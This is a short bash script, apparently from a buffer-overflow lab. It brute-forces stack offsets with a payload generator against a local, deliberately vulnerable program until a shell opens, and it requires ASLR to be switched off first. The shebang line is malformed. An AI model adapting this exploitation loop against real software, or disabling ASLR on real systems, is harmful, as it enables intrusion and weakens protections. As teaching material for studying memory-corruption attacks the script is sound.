#/bin/bash
#
# fuzzer1.sh
# This is a tool that generates exploitation strings and tries to exploit the
# vulnarable program. Note, that fuzzer1.sh must reside in the same directory
# where generator1 and vulnerable1 programs are located.
#
# Usage:
# 1. cd ./build
# 2. ./fuzzer1.sh
# ==> fuzzing should eventually end popping up the shell
# 3. follow the instructions from the output how to properly exit the shell
# 4. payload1.txt file at this moment contains the working exploitation string
# 5. check it with: ./vulnerable1 `cat payload1.txt`

# check for ASLR
aslrsetting=/proc/sys/kernel/randomize_va_space
aslr=`cat $aslrsetting`
if [ "$aslr" != "0" ]; then
    printf "Cannot proceed, ASLR is enabled. please run %s first\n" \
        "\"echo 0 > $aslrsetting\""
    exit 1
fi

# prepare essentials
buffersize=800 # default
offset=0 # default
if [ "$#" -gt 0 ]; then
    number='^[0-9]+$'
    if ! [[ $1 =~ $number ]]; then
        printf "Error: invalid parameter\n"
        exit 1
    fi
    buffersize=$1
fi
it=0
exitflag="/tmp/terminate1"
rm -f $exitflag

# generate
while [ ! -f $exitflag ]; do
    printf "Try: %s, buffersize: %s, offset: %s, " \
        $it $buffersize $offset
    printf "on success exit shell with: \"touch %s && exit\"\n" \
        $exitflag
    ./generator1 $buffersize $offset
    if [ "$?" -ne "0" ]; then
        printf "Error: invalid generator parameters\n"
        exit 1
    fi
    # exploit
    ./vulnerable1 `cat payload1.txt`
    offset=$(($offset+4)) # consider 4-byte stack alignment
    it=$(($it+1))
done

